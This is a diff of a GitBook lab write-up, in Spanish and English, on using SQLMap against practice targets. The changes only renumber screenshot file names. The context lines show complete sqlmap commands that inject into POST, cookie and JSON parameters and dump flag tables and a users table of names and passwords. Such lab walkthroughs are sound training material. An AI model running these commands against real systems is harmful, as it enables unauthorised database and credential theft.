@@ -26,7 +26,7 @@ Vemos cómo se llaman las bases de datos.
 sqlmap -u 'http://94.237.57.211:53268/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha tabla.
 
@@ -37,7 +37,7 @@ Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha
   -D testdb -T flag2 --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What's the contents of table flag3? (Case #3)**
 
@@ -45,7 +45,7 @@ Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha
 sqlmap -u "http://94.237.57.211:53268/case3.php" --cookie 'id=1*' -T flag3 --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 What's the contents of table flag4? (Case #4)
 
@@ -53,7 +53,7 @@ What's the contents of table flag4? (Case #4)
 sqlmap -u 'http://94.237.57.211:53268/case4.php' -H 'Content-Type: application/json' --data '{"id":1}' -T flag4 --dump --method POST
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Attack Tuning
 
@@ -106,7 +106,7 @@ sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' -T flag1 --dump --batch --
 sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --batch --search -C "style"
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What's the Kimberly user's password? (Case #1)**
 
@@ -114,7 +114,7 @@ sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --batch --search -C "style
  sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --dump --batch --columns -C name,password -T users
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Advanced SQLMap Usage
 
